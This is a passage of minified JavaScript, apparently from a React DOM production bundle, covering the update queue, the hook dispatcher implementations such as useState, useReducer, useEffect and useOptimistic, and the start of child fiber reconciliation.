											? W.call(me, R, E)
											: W),
									E == null)
								)
									break e;
								R = w({}, R, E);
								break e;
							case 2:
								el = !0;
						}
					}
					(E = s.callback),
						E !== null &&
							((e.flags |= 64),
							j && (e.flags |= 8192),
							(j = n.callbacks),
							j === null ? (n.callbacks = [E]) : j.push(E));
				} else
					(j = {
						lane: E,
						tag: s.tag,
						payload: s.payload,
						callback: s.callback,
						next: null,
					}),
						T === null ? ((S = T = j), (m = R)) : (T = T.next = j),
						(i |= E);
				if (((s = s.next), s === null)) {
					if (((s = n.shared.pending), s === null)) break;
					(j = s),
						(s = j.next),
						(j.next = null),
						(n.lastBaseUpdate = j),
						(n.shared.pending = null);
				}
			} while (!0);
			T === null && (m = R),
				(n.baseState = m),
				(n.firstBaseUpdate = S),
				(n.lastBaseUpdate = T),
				u === null && (n.shared.lanes = 0),
				(rl |= i),
				(e.lanes = i),
				(e.memoizedState = R);
		}
	}
	function Jf(e, t) {
		if (typeof e != "function") throw Error(r(191, e));
		e.call(t);
	}
	function $f(e, t) {
		var l = e.callbacks;
		if (l !== null)
			for (e.callbacks = null, e = 0; e < l.length; e++) Jf(l[e], t);
	}
	var ca = _(null),
		cn = _(0);
	function Wf(e, t) {
		(e = Qt), L(cn, e), L(ca, t), (Qt = e | t.baseLanes);
	}
	function Pu() {
		L(cn, Qt), L(ca, ca.current);
	}
	function Iu() {
		(Qt = cn.current), q(ca), q(cn);
	}
	var al = 0,
		te = null,
		de = null,
		we = null,
		fn = !1,
		fa = !1,
		Ul = !1,
		sn = 0,
		Ia = 0,
		sa = null,
		y9 = 0;
	function Te() {
		throw Error(r(321));
	}
	function ei(e, t) {
		if (t === null) return !1;
		for (var l = 0; l < t.length && l < e.length; l++)
			if (!at(e[l], t[l])) return !1;
		return !0;
	}
	function ti(e, t, l, a, n, u) {
		return (
			(al = u),
			(te = t),
			(t.memoizedState = null),
			(t.updateQueue = null),
			(t.lanes = 0),
			(M.H = e === null || e.memoizedState === null ? _s : Ds),
			(Ul = !1),
			(u = l(a, n)),
			(Ul = !1),
			fa && (u = Pf(t, l, a, n)),
			Ff(e),
			u
		);
	}
	function Ff(e) {
		M.H = pn;
		var t = de !== null && de.next !== null;
		if (
			((al = 0),
			(we = de = te = null),
			(fn = !1),
			(Ia = 0),
			(sa = null),
			t)
		)
			throw Error(r(300));
		e === null ||
			He ||
			((e = e.dependencies), e !== null && tn(e) && (He = !0));
	}
	function Pf(e, t, l, a) {
		te = e;
		var n = 0;
		do {
			if ((fa && (sa = null), (Ia = 0), (fa = !1), 25 <= n))
				throw Error(r(301));
			if (((n += 1), (we = de = null), e.updateQueue != null)) {
				var u = e.updateQueue;
				(u.lastEffect = null),
					(u.events = null),
					(u.stores = null),
					u.memoCache != null && (u.memoCache.index = 0);
			}
			(M.H = T9), (u = t(l, a));
		} while (fa);
		return u;
	}
	function b9() {
		var e = M.H,
			t = e.useState()[0];
		return (
			(t = typeof t.then == "function" ? e1(t) : t),
			(e = e.useState()[0]),
			(de !== null ? de.memoizedState : null) !== e && (te.flags |= 1024),
			t
		);
	}
	function li() {
		var e = sn !== 0;
		return (sn = 0), e;
	}
	function ai(e, t, l) {
		(t.updateQueue = e.updateQueue), (t.flags &= -2053), (e.lanes &= ~l);
	}
	function ni(e) {
		if (fn) {
			for (e = e.memoizedState; e !== null; ) {
				var t = e.queue;
				t !== null && (t.pending = null), (e = e.next);
			}
			fn = !1;
		}
		(al = 0), (we = de = te = null), (fa = !1), (Ia = sn = 0), (sa = null);
	}
	function We() {
		var e = {
			memoizedState: null,
			baseState: null,
			baseQueue: null,
			queue: null,
			next: null,
		};
		return (
			we === null ? (te.memoizedState = we = e) : (we = we.next = e), we
		);
	}
	function Me() {
		if (de === null) {
			var e = te.alternate;
			e = e !== null ? e.memoizedState : null;
		} else e = de.next;
		var t = we === null ? te.memoizedState : we.next;
		if (t !== null) (we = t), (de = e);
		else {
			if (e === null)
				throw te.alternate === null ? Error(r(467)) : Error(r(310));
			(de = e),
				(e = {
					memoizedState: de.memoizedState,
					baseState: de.baseState,
					baseQueue: de.baseQueue,
					queue: de.queue,
					next: null,
				}),
				we === null ? (te.memoizedState = we = e) : (we = we.next = e);
		}
		return we;
	}
	function ui() {
		return {
			lastEffect: null,
			events: null,
			stores: null,
			memoCache: null,
		};
	}
	function e1(e) {
		var t = Ia;
		return (
			(Ia += 1),
			sa === null && (sa = []),
			(e = Vf(sa, e, t)),
			(t = te),
			(we === null ? t.memoizedState : we.next) === null &&
				((t = t.alternate),
				(M.H = t === null || t.memoizedState === null ? _s : Ds)),
			e
		);
	}
	function rn(e) {
		if (e !== null && typeof e == "object") {
			if (typeof e.then == "function") return e1(e);
			if (e.$$typeof === I) return Ve(e);
		}
		throw Error(r(438, String(e)));
	}
	function ii(e) {
		var t = null,
			l = te.updateQueue;
		if ((l !== null && (t = l.memoCache), t == null)) {
			var a = te.alternate;
			a !== null &&
				((a = a.updateQueue),
				a !== null &&
					((a = a.memoCache),
					a != null &&
						(t = {
							data: a.data.map(function (n) {
								return n.slice();
							}),
							index: 0,
						})));
		}
		if (
			(t == null && (t = { data: [], index: 0 }),
			l === null && ((l = ui()), (te.updateQueue = l)),
			(l.memoCache = t),
			(l = t.data[t.index]),
			l === void 0)
		)
			for (l = t.data[t.index] = Array(e), a = 0; a < e; a++) l[a] = Ie;
		return t.index++, l;
	}
	function Bt(e, t) {
		return typeof t == "function" ? t(e) : t;
	}
	function on(e) {
		var t = Me();
		return ci(t, de, e);
	}
	function ci(e, t, l) {
		var a = e.queue;
		if (a === null) throw Error(r(311));
		a.lastRenderedReducer = l;
		var n = e.baseQueue,
			u = a.pending;
		if (u !== null) {
			if (n !== null) {
				var i = n.next;
				(n.next = u.next), (u.next = i);
			}
			(t.baseQueue = n = u), (a.pending = null);
		}
		if (((u = e.baseState), n === null)) e.memoizedState = u;
		else {
			t = n.next;
			var s = (i = null),
				m = null,
				S = t,
				T = !1;
			do {
				var R = S.lane & -536870913;
				if (R !== S.lane ? (ue & R) === R : (al & R) === R) {
					var E = S.revertLane;
					if (E === 0)
						m !== null &&
							(m = m.next =
								{
									lane: 0,
									revertLane: 0,
									action: S.action,
									hasEagerState: S.hasEagerState,
									eagerState: S.eagerState,
									next: null,
								}),
							R === ua && (T = !0);
					else if ((al & E) === E) {
						(S = S.next), E === ua && (T = !0);
						continue;
					} else
						(R = {
							lane: 0,
							revertLane: S.revertLane,
							action: S.action,
							hasEagerState: S.hasEagerState,
							eagerState: S.eagerState,
							next: null,
						}),
							m === null
								? ((s = m = R), (i = u))
								: (m = m.next = R),
							(te.lanes |= E),
							(rl |= E);
					(R = S.action),
						Ul && l(u, R),
						(u = S.hasEagerState ? S.eagerState : l(u, R));
				} else
					(E = {
						lane: R,
						revertLane: S.revertLane,
						action: S.action,
						hasEagerState: S.hasEagerState,
						eagerState: S.eagerState,
						next: null,
					}),
						m === null ? ((s = m = E), (i = u)) : (m = m.next = E),
						(te.lanes |= R),
						(rl |= R);
				S = S.next;
			} while (S !== null && S !== t);
			if (
				(m === null ? (i = u) : (m.next = s),
				!at(u, e.memoizedState) &&
					((He = !0), T && ((l = ia), l !== null)))
			)
				throw l;
			(e.memoizedState = u),
				(e.baseState = i),
				(e.baseQueue = m),
				(a.lastRenderedState = u);
		}
		return n === null && (a.lanes = 0), [e.memoizedState, a.dispatch];
	}
	function fi(e) {
		var t = Me(),
			l = t.queue;
		if (l === null) throw Error(r(311));
		l.lastRenderedReducer = e;
		var a = l.dispatch,
			n = l.pending,
			u = t.memoizedState;
		if (n !== null) {
			l.pending = null;
			var i = (n = n.next);
			do (u = e(u, i.action)), (i = i.next);
			while (i !== n);
			at(u, t.memoizedState) || (He = !0),
				(t.memoizedState = u),
				t.baseQueue === null && (t.baseState = u),
				(l.lastRenderedState = u);
		}
		return [u, a];
	}
	function If(e, t, l) {
		var a = te,
			n = Me(),
			u = se;
		if (u) {
			if (l === void 0) throw Error(r(407));
			l = l();
		} else l = t();
		var i = !at((de || n).memoizedState, l);
		i && ((n.memoizedState = l), (He = !0)), (n = n.queue);
		var s = ls.bind(null, a, n, e);
		if (
			(t1(2048, 8, s, [e]),
			n.getSnapshot !== t ||
				i ||
				(we !== null && we.memoizedState.tag & 1))
		) {
			if (
				((a.flags |= 2048),
				ra(9, dn(), ts.bind(null, a, n, l, t), null),
				ge === null)
			)
				throw Error(r(349));
			u || (al & 124) !== 0 || es(a, t, l);
		}
		return l;
	}
	function es(e, t, l) {
		(e.flags |= 16384),
			(e = { getSnapshot: t, value: l }),
			(t = te.updateQueue),
			t === null
				? ((t = ui()), (te.updateQueue = t), (t.stores = [e]))
				: ((l = t.stores), l === null ? (t.stores = [e]) : l.push(e));
	}
	function ts(e, t, l, a) {
		(t.value = l), (t.getSnapshot = a), as(t) && ns(e);
	}
	function ls(e, t, l) {
		return l(function () {
			as(t) && ns(e);
		});
	}
	function as(e) {
		var t = e.getSnapshot;
		e = e.value;
		try {
			var l = t();
			return !at(e, l);
		} catch {
			return !0;
		}
	}
	function ns(e) {
		var t = ta(e, 2);
		t !== null && st(t, e, 2);
	}
	function si(e) {
		var t = We();
		if (typeof e == "function") {
			var l = e;
			if (((e = l()), Ul)) {
				Wt(!0);
				try {
					l();
				} finally {
					Wt(!1);
				}
			}
		}
		return (
			(t.memoizedState = t.baseState = e),
			(t.queue = {
				pending: null,
				lanes: 0,
				dispatch: null,
				lastRenderedReducer: Bt,
				lastRenderedState: e,
			}),
			t
		);
	}
	function us(e, t, l, a) {
		return (e.baseState = l), ci(e, de, typeof a == "function" ? a : Bt);
	}
	function C9(e, t, l, a, n) {
		if (mn(e)) throw Error(r(485));
		if (((e = t.action), e !== null)) {
			var u = {
				payload: n,
				action: e,
				next: null,
				isTransition: !0,
				status: "pending",
				value: null,
				reason: null,
				listeners: [],
				then: function (i) {
					u.listeners.push(i);
				},
			};
			M.T !== null ? l(!0) : (u.isTransition = !1),
				a(u),
				(l = t.pending),
				l === null
					? ((u.next = t.pending = u), is(t, u))
					: ((u.next = l.next), (t.pending = l.next = u));
		}
	}
	function is(e, t) {
		var l = t.action,
			a = t.payload,
			n = e.state;
		if (t.isTransition) {
			var u = M.T,
				i = {};
			M.T = i;
			try {
				var s = l(n, a),
					m = M.S;
				m !== null && m(i, s), cs(e, t, s);
			} catch (S) {
				ri(e, t, S);
			} finally {
				M.T = u;
			}
		} else
			try {
				(u = l(n, a)), cs(e, t, u);
			} catch (S) {
				ri(e, t, S);
			}
	}
	function cs(e, t, l) {
		l !== null && typeof l == "object" && typeof l.then == "function"
			? l.then(
					function (a) {
						fs(e, t, a);
					},
					function (a) {
						return ri(e, t, a);
					}
			  )
			: fs(e, t, l);
	}
	function fs(e, t, l) {
		(t.status = "fulfilled"),
			(t.value = l),
			ss(t),
			(e.state = l),
			(t = e.pending),
			t !== null &&
				((l = t.next),
				l === t
					? (e.pending = null)
					: ((l = l.next), (t.next = l), is(e, l)));
	}
	function ri(e, t, l) {
		var a = e.pending;
		if (((e.pending = null), a !== null)) {
			a = a.next;
			do (t.status = "rejected"), (t.reason = l), ss(t), (t = t.next);
			while (t !== a);
		}
		e.action = null;
	}
	function ss(e) {
		e = e.listeners;
		for (var t = 0; t < e.length; t++) (0, e[t])();
	}
	function rs(e, t) {
		return t;
	}
	function os(e, t) {
		if (se) {
			var l = ge.formState;
			if (l !== null) {
				e: {
					var a = te;
					if (se) {
						if (je) {
							t: {
								for (var n = je, u = jt; n.nodeType !== 8; ) {
									if (!u) {
										n = null;
										break t;
									}
									if (((n = St(n.nextSibling)), n === null)) {
										n = null;
										break t;
									}
								}
								(u = n.data),
									(n = u === "F!" || u === "F" ? n : null);
							}
							if (n) {
								(je = St(n.nextSibling)), (a = n.data === "F!");
								break e;
							}
						}
						Rl(a);
					}
					a = !1;
				}
				a && (t = l[0]);
			}
		}
		return (
			(l = We()),
			(l.memoizedState = l.baseState = t),
			(a = {
				pending: null,
				lanes: 0,
				dispatch: null,
				lastRenderedReducer: rs,
				lastRenderedState: t,
			}),
			(l.queue = a),
			(l = Os.bind(null, te, a)),
			(a.dispatch = l),
			(a = si(!1)),
			(u = pi.bind(null, te, !1, a.queue)),
			(a = We()),
			(n = { state: t, dispatch: null, action: e, pending: null }),
			(a.queue = n),
			(l = C9.bind(null, te, n, u, l)),
			(n.dispatch = l),
			(a.memoizedState = e),
			[t, l, !1]
		);
	}
	function ds(e) {
		var t = Me();
		return hs(t, de, e);
	}
	function hs(e, t, l) {
		if (
			((t = ci(e, t, rs)[0]),
			(e = on(Bt)[0]),
			typeof t == "object" && t !== null && typeof t.then == "function")
		)
			try {
				var a = e1(t);
			} catch (i) {
				throw i === Ja ? nn : i;
			}
		else a = t;
		t = Me();
		var n = t.queue,
			u = n.dispatch;
		return (
			l !== t.memoizedState &&
				((te.flags |= 2048), ra(9, dn(), S9.bind(null, n, l), null)),
			[a, u, e]
		);
	}
	function S9(e, t) {
		e.action = t;
	}
	function ms(e) {
		var t = Me(),
			l = de;
		if (l !== null) return hs(t, l, e);
		Me(), (t = t.memoizedState), (l = Me());
		var a = l.queue.dispatch;
		return (l.memoizedState = e), [t, a, !1];
	}
	function ra(e, t, l, a) {
		return (
			(e = { tag: e, create: l, deps: a, inst: t, next: null }),
			(t = te.updateQueue),
			t === null && ((t = ui()), (te.updateQueue = t)),
			(l = t.lastEffect),
			l === null
				? (t.lastEffect = e.next = e)
				: ((a = l.next),
				  (l.next = e),
				  (e.next = a),
				  (t.lastEffect = e)),
			e
		);
	}
	function dn() {
		return { destroy: void 0, resource: void 0 };
	}
	function ps() {
		return Me().memoizedState;
	}
	function hn(e, t, l, a) {
		var n = We();
		(a = a === void 0 ? null : a),
			(te.flags |= e),
			(n.memoizedState = ra(1 | t, dn(), l, a));
	}
	function t1(e, t, l, a) {
		var n = Me();
		a = a === void 0 ? null : a;
		var u = n.memoizedState.inst;
		de !== null && a !== null && ei(a, de.memoizedState.deps)
			? (n.memoizedState = ra(t, u, l, a))
			: ((te.flags |= e), (n.memoizedState = ra(1 | t, u, l, a)));
	}
	function xs(e, t) {
		hn(8390656, 8, e, t);
	}
	function gs(e, t) {
		t1(2048, 8, e, t);
	}
	function vs(e, t) {
		return t1(4, 2, e, t);
	}
	function ys(e, t) {
		return t1(4, 4, e, t);
	}
	function bs(e, t) {
		if (typeof t == "function") {
			e = e();
			var l = t(e);
			return function () {
				typeof l == "function" ? l() : t(null);
			};
		}
		if (t != null)
			return (
				(e = e()),
				(t.current = e),
				function () {
					t.current = null;
				}
			);
	}
	function Cs(e, t, l) {
		(l = l != null ? l.concat([e]) : null),
			t1(4, 4, bs.bind(null, t, e), l);
	}
	function oi() {}
	function Ss(e, t) {
		var l = Me();
		t = t === void 0 ? null : t;
		var a = l.memoizedState;
		return t !== null && ei(t, a[1])
			? a[0]
			: ((l.memoizedState = [e, t]), e);
	}
	function Es(e, t) {
		var l = Me();
		t = t === void 0 ? null : t;
		var a = l.memoizedState;
		if (t !== null && ei(t, a[1])) return a[0];
		if (((a = e()), Ul)) {
			Wt(!0);
			try {
				e();
			} finally {
				Wt(!1);
			}
		}
		return (l.memoizedState = [a, t]), a;
	}
	function di(e, t, l) {
		return l === void 0 || (al & 1073741824) !== 0
			? (e.memoizedState = t)
			: ((e.memoizedState = l),
			  (e = Tr()),
			  (te.lanes |= e),
			  (rl |= e),
			  l);
	}
	function js(e, t, l, a) {
		return at(l, t)
			? l
			: ca.current !== null
			? ((e = di(e, l, a)), at(e, t) || (He = !0), e)
			: (al & 42) === 0
			? ((He = !0), (e.memoizedState = l))
			: ((e = Tr()), (te.lanes |= e), (rl |= e), t);
	}
	function Ns(e, t, l, a, n) {
		var u = B.p;
		B.p = u !== 0 && 8 > u ? u : 8;
		var i = M.T,
			s = {};
		(M.T = s), pi(e, !1, t, l);
		try {
			var m = n(),
				S = M.S;
			if (
				(S !== null && S(s, m),
				m !== null &&
					typeof m == "object" &&
					typeof m.then == "function")
			) {
				var T = v9(m, a);
				l1(e, t, T, ft(e));
			} else l1(e, t, a, ft(e));
		} catch (R) {
			l1(
				e,
				t,
				{ then: function () {}, status: "rejected", reason: R },
				ft()
			);
		} finally {
			(B.p = u), (M.T = i);
		}
	}
	function E9() {}
	function hi(e, t, l, a) {
		if (e.tag !== 5) throw Error(r(476));
		var n = Ts(e).queue;
		Ns(
			e,
			n,
			t,
			$,
			l === null
				? E9
				: function () {
						return As(e), l(a);
				  }
		);
	}
	function Ts(e) {
		var t = e.memoizedState;
		if (t !== null) return t;
		t = {
			memoizedState: $,
			baseState: $,
			baseQueue: null,
			queue: {
				pending: null,
				lanes: 0,
				dispatch: null,
				lastRenderedReducer: Bt,
				lastRenderedState: $,
			},
			next: null,
		};
		var l = {};
		return (
			(t.next = {
				memoizedState: l,
				baseState: l,
				baseQueue: null,
				queue: {
					pending: null,
					lanes: 0,
					dispatch: null,
					lastRenderedReducer: Bt,
					lastRenderedState: l,
				},
				next: null,
			}),
			(e.memoizedState = t),
			(e = e.alternate),
			e !== null && (e.memoizedState = t),
			t
		);
	}
	function As(e) {
		var t = Ts(e).next.queue;
		l1(e, t, {}, ft());
	}
	function mi() {
		return Ve(b1);
	}
	function ws() {
		return Me().memoizedState;
	}
	function Ms() {
		return Me().memoizedState;
	}
	function j9(e) {
		for (var t = e.return; t !== null; ) {
			switch (t.tag) {
				case 24:
				case 3:
					var l = ft();
					e = tl(l);
					var a = ll(t, e, l);
					a !== null && (st(a, t, l), Wa(a, t, l)),
						(t = { cache: Qu() }),
						(e.payload = t);
					return;
			}
			t = t.return;
		}
	}
	function N9(e, t, l) {
		var a = ft();
		(l = {
			lane: a,
			revertLane: 0,
			action: l,
			hasEagerState: !1,
			eagerState: null,
			next: null,
		}),
			mn(e)
				? Rs(t, l)
				: ((l = Du(e, t, l, a)),
				  l !== null && (st(l, e, a), zs(l, t, a)));
	}
	function Os(e, t, l) {
		var a = ft();
		l1(e, t, l, a);
	}
	function l1(e, t, l, a) {
		var n = {
			lane: a,
			revertLane: 0,
			action: l,
			hasEagerState: !1,
			eagerState: null,
			next: null,
		};
		if (mn(e)) Rs(t, n);
		else {
			var u = e.alternate;
			if (
				e.lanes === 0 &&
				(u === null || u.lanes === 0) &&
				((u = t.lastRenderedReducer), u !== null)
			)
				try {
					var i = t.lastRenderedState,
						s = u(i, l);
					if (((n.hasEagerState = !0), (n.eagerState = s), at(s, i)))
						return W1(e, t, n, 0), ge === null && $1(), !1;
				} catch {
				} finally {
				}
			if (((l = Du(e, t, n, a)), l !== null))
				return st(l, e, a), zs(l, t, a), !0;
		}
		return !1;
	}
	function pi(e, t, l, a) {
		if (
			((a = {
				lane: 2,
				revertLane: Ki(),
				action: a,
				hasEagerState: !1,
				eagerState: null,
				next: null,
			}),
			mn(e))
		) {
			if (t) throw Error(r(479));
		} else (t = Du(e, l, a, 2)), t !== null && st(t, e, 2);
	}
	function mn(e) {
		var t = e.alternate;
		return e === te || (t !== null && t === te);
	}
	function Rs(e, t) {
		fa = fn = !0;
		var l = e.pending;
		l === null ? (t.next = t) : ((t.next = l.next), (l.next = t)),
			(e.pending = t);
	}
	function zs(e, t, l) {
		if ((l & 4194048) !== 0) {
			var a = t.lanes;
			(a &= e.pendingLanes), (l |= a), (t.lanes = l), qc(e, l);
		}
	}
	var pn = {
			readContext: Ve,
			use: rn,
			useCallback: Te,
			useContext: Te,
			useEffect: Te,
			useImperativeHandle: Te,
			useLayoutEffect: Te,
			useInsertionEffect: Te,
			useMemo: Te,
			useReducer: Te,
			useRef: Te,
			useState: Te,
			useDebugValue: Te,
			useDeferredValue: Te,
			useTransition: Te,
			useSyncExternalStore: Te,
			useId: Te,
			useHostTransitionStatus: Te,
			useFormState: Te,
			useActionState: Te,
			useOptimistic: Te,
			useMemoCache: Te,
			useCacheRefresh: Te,
		},
		_s = {
			readContext: Ve,
			use: rn,
			useCallback: function (e, t) {
				return (We().memoizedState = [e, t === void 0 ? null : t]), e;
			},
			useContext: Ve,
			useEffect: xs,
			useImperativeHandle: function (e, t, l) {
				(l = l != null ? l.concat([e]) : null),
					hn(4194308, 4, bs.bind(null, t, e), l);
			},
			useLayoutEffect: function (e, t) {
				return hn(4194308, 4, e, t);
			},
			useInsertionEffect: function (e, t) {
				hn(4, 2, e, t);
			},
			useMemo: function (e, t) {
				var l = We();
				t = t === void 0 ? null : t;
				var a = e();
				if (Ul) {
					Wt(!0);
					try {
						e();
					} finally {
						Wt(!1);
					}
				}
				return (l.memoizedState = [a, t]), a;
			},
			useReducer: function (e, t, l) {
				var a = We();
				if (l !== void 0) {
					var n = l(t);
					if (Ul) {
						Wt(!0);
						try {
							l(t);
						} finally {
							Wt(!1);
						}
					}
				} else n = t;
				return (
					(a.memoizedState = a.baseState = n),
					(e = {
						pending: null,
						lanes: 0,
						dispatch: null,
						lastRenderedReducer: e,
						lastRenderedState: n,
					}),
					(a.queue = e),
					(e = e.dispatch = N9.bind(null, te, e)),
					[a.memoizedState, e]
				);
			},
			useRef: function (e) {
				var t = We();
				return (e = { current: e }), (t.memoizedState = e);
			},
			useState: function (e) {
				e = si(e);
				var t = e.queue,
					l = Os.bind(null, te, t);
				return (t.dispatch = l), [e.memoizedState, l];
			},
			useDebugValue: oi,
			useDeferredValue: function (e, t) {
				var l = We();
				return di(l, e, t);
			},
			useTransition: function () {
				var e = si(!1);
				return (
					(e = Ns.bind(null, te, e.queue, !0, !1)),
					(We().memoizedState = e),
					[!1, e]
				);
			},
			useSyncExternalStore: function (e, t, l) {
				var a = te,
					n = We();
				if (se) {
					if (l === void 0) throw Error(r(407));
					l = l();
				} else {
					if (((l = t()), ge === null)) throw Error(r(349));
					(ue & 124) !== 0 || es(a, t, l);
				}
				n.memoizedState = l;
				var u = { value: l, getSnapshot: t };
				return (
					(n.queue = u),
					xs(ls.bind(null, a, u, e), [e]),
					(a.flags |= 2048),
					ra(9, dn(), ts.bind(null, a, u, l, t), null),
					l
				);
			},
			useId: function () {
				var e = We(),
					t = ge.identifierPrefix;
				if (se) {
					var l = Ut,
						a = Dt;
					(l = (a & ~(1 << (32 - lt(a) - 1))).toString(32) + l),
						(t = "«" + t + "R" + l),
						(l = sn++),
						0 < l && (t += "H" + l.toString(32)),
						(t += "»");
				} else (l = y9++), (t = "«" + t + "r" + l.toString(32) + "»");
				return (e.memoizedState = t);
			},
			useHostTransitionStatus: mi,
			useFormState: os,
			useActionState: os,
			useOptimistic: function (e) {
				var t = We();
				t.memoizedState = t.baseState = e;
				var l = {
					pending: null,
					lanes: 0,
					dispatch: null,
					lastRenderedReducer: null,
					lastRenderedState: null,
				};
				return (
					(t.queue = l),
					(t = pi.bind(null, te, !0, l)),
					(l.dispatch = t),
					[e, t]
				);
			},
			useMemoCache: ii,
			useCacheRefresh: function () {
				return (We().memoizedState = j9.bind(null, te));
			},
		},
		Ds = {
			readContext: Ve,
			use: rn,
			useCallback: Ss,
			useContext: Ve,
			useEffect: gs,
			useImperativeHandle: Cs,
			useInsertionEffect: vs,
			useLayoutEffect: ys,
			useMemo: Es,
			useReducer: on,
			useRef: ps,
			useState: function () {
				return on(Bt);
			},
			useDebugValue: oi,
			useDeferredValue: function (e, t) {
				var l = Me();
				return js(l, de.memoizedState, e, t);
			},
			useTransition: function () {
				var e = on(Bt)[0],
					t = Me().memoizedState;
				return [typeof e == "boolean" ? e : e1(e), t];
			},
			useSyncExternalStore: If,
			useId: ws,
			useHostTransitionStatus: mi,
			useFormState: ds,
			useActionState: ds,
			useOptimistic: function (e, t) {
				var l = Me();
				return us(l, de, e, t);
			},
			useMemoCache: ii,
			useCacheRefresh: Ms,
		},
		T9 = {
			readContext: Ve,
			use: rn,
			useCallback: Ss,
			useContext: Ve,
			useEffect: gs,
			useImperativeHandle: Cs,
			useInsertionEffect: vs,
			useLayoutEffect: ys,
			useMemo: Es,
			useReducer: fi,
			useRef: ps,
			useState: function () {
				return fi(Bt);
			},
			useDebugValue: oi,
			useDeferredValue: function (e, t) {
				var l = Me();
				return de === null
					? di(l, e, t)
					: js(l, de.memoizedState, e, t);
			},
			useTransition: function () {
				var e = fi(Bt)[0],
					t = Me().memoizedState;
				return [typeof e == "boolean" ? e : e1(e), t];
			},
			useSyncExternalStore: If,
			useId: ws,
			useHostTransitionStatus: mi,
			useFormState: ms,
			useActionState: ms,
			useOptimistic: function (e, t) {
				var l = Me();
				return de !== null
					? us(l, de, e, t)
					: ((l.baseState = e), [e, l.queue.dispatch]);
			},
			useMemoCache: ii,
			useCacheRefresh: Ms,
		},
		oa = null,
		a1 = 0;
	function xn(e) {
		var t = a1;
		return (a1 += 1), oa === null && (oa = []), Vf(oa, e, t);
	}
	function n1(e, t) {
		(t = t.props.ref), (e.ref = t !== void 0 ? t : null);
	}
	function gn(e, t) {
		throw t.$$typeof === D
			? Error(r(525))
			: ((e = Object.prototype.toString.call(t)),
			  Error(
					r(
						31,
						e === "[object Object]"
							? "object with keys {" +
									Object.keys(t).join(", ") +
									"}"
							: e
					)
			  ));
	}
	function Us(e) {
		var t = e._init;
		return t(e._payload);
	}
	function Hs(e) {
		function t(y, g) {
			if (e) {
				var C = y.deletions;
				C === null ? ((y.deletions = [g]), (y.flags |= 16)) : C.push(g);
			}
		}
		function l(y, g) {
			if (!e) return null;
			for (; g !== null; ) t(y, g), (g = g.sibling);
			return null;
		}
		function a(y) {
			for (var g = new Map(); y !== null; )
				y.key !== null ? g.set(y.key, y) : g.set(y.index, y),
					(y = y.sibling);
			return g;
		}
		function n(y, g) {
			return (y = _t(y, g)), (y.index = 0), (y.sibling = null), y;
		}
		function u(y, g, C) {
			return (
				(y.index = C),
				e
					? ((C = y.alternate),
					  C !== null
							? ((C = C.index),
							  C < g ? ((y.flags |= 67108866), g) : C)
							: ((y.flags |= 67108866), g))
					: ((y.flags |= 1048576), g)
			);
		}
		function i(y) {
			return e && y.alternate === null && (y.flags |= 67108866), y;
		}
		function s(y, g, C, O) {
			return g === null || g.tag !== 6
				? ((g = Hu(C, y.mode, O)), (g.return = y), g)
				: ((g = n(g, C)), (g.return = y), g);
		}
		function m(y, g, C, O) {
			var Y = C.type;
			return Y === X
				? T(y, g, C.props.children, O, C.key)
				: g !== null &&
				  (g.elementType === Y ||
						(typeof Y == "object" &&
							Y !== null &&
							Y.$$typeof === De &&
							Us(Y) === g.type))
				? ((g = n(g, C.props)), n1(g, C), (g.return = y), g)
				: ((g = P1(C.type, C.key, C.props, null, y.mode, O)),
				  n1(g, C),
				  (g.return = y),
				  g);
		}
		function S(y, g, C, O) {
			return g === null ||
				g.tag !== 4 ||
				g.stateNode.containerInfo !== C.containerInfo ||
				g.stateNode.implementation !== C.implementation
				? ((g = Lu(C, y.mode, O)), (g.return = y), g)
				: ((g = n(g, C.children || [])), (g.return = y), g);
		}
		function T(y, g, C, O, Y) {
			return g === null || g.tag !== 7
				? ((g = Al(C, y.mode, O, Y)), (g.return = y), g)
				: ((g = n(g, C)), (g.return = y), g);
		}
		function R(y, g, C) {
			if (
				(typeof g == "string" && g !== "") ||
				typeof g == "number" ||
				typeof g == "bigint"
			)
				return (g = Hu("" + g, y.mode, C)), (g.return = y), g;
			if (typeof g == "object" && g !== null) {
				switch (g.$$typeof) {
					case U:
						return (
							(C = P1(g.type, g.key, g.props, null, y.mode, C)),
							n1(C, g),
							(C.return = y),
							C
						);
					case J:
						return (g = Lu(g, y.mode, C)), (g.return = y), g;
					case De:
						var O = g._init;
						return (g = O(g._payload)), R(y, g, C);
				}
				if (Xe(g) || Ze(g))
					return (g = Al(g, y.mode, C, null)), (g.return = y), g;
				if (typeof g.then == "function") return R(y, xn(g), C);
				if (g.$$typeof === I) return R(y, ln(y, g), C);
				gn(y, g);
			}
			return null;
		}
		function E(y, g, C, O) {
			var Y = g !== null ? g.key : null;
			if (
				(typeof C == "string" && C !== "") ||
				typeof C == "number" ||
				typeof C == "bigint"
			)
				return Y !== null ? null : s(y, g, "" + C, O);
			if (typeof C == "object" && C !== null) {
				switch (C.$$typeof) {
					case U:
						return C.key === Y ? m(y, g, C, O) : null;
					case J:
						return C.key === Y ? S(y, g, C, O) : null;
					case De:
						return (
							(Y = C._init), (C = Y(C._payload)), E(y, g, C, O)
						);
				}
				if (Xe(C) || Ze(C))
					return Y !== null ? null : T(y, g, C, O, null);
				if (typeof C.then == "function") return E(y, g, xn(C), O);
				if (C.$$typeof === I) return E(y, g, ln(y, C), O);
				gn(y, C);
			}
			return null;
		}
		function j(y, g, C, O, Y) {
			if (
				(typeof O == "string" && O !== "") ||
				typeof O == "number" ||
				typeof O == "bigint"
			)
				return (y = y.get(C) || null), s(g, y, "" + O, Y);
			if (typeof O == "object" && O !== null) {
				switch (O.$$typeof) {
					case U:
						return (
							(y = y.get(O.key === null ? C : O.key) || null),
							m(g, y, O, Y)
						);
					case J:
						return (
							(y = y.get(O.key === null ? C : O.key) || null),
							S(g, y, O, Y)
						);
					case De:
						var le = O._init;
						return (O = le(O._payload)), j(y, g, C, O, Y);
				}
				if (Xe(O) || Ze(O))
					return (y = y.get(C) || null), T(g, y, O, Y, null);
				if (typeof O.then == "function") return j(y, g, C, xn(O), Y);
				if (O.$$typeof === I) return j(y, g, C, ln(g, O), Y);
				gn(g, O);
			}
			return null;
		}
		function W(y, g, C, O) {
			for (
				var Y = null, le = null, Z = g, K = (g = 0), Be = null;
				Z !== null && K < C.length;
				K++
			) {
				Z.index > K ? ((Be = Z), (Z = null)) : (Be = Z.sibling);
				var fe = E(y, Z, C[K], O);
				if (fe === null) {
					Z === null && (Z = Be);
					break;
				}
				e && Z && fe.alternate === null && t(y, Z),
					(g = u(fe, g, K)),
					le === null ? (Y = fe) : (le.sibling = fe),
					(le = fe),
					(Z = Be);
			}
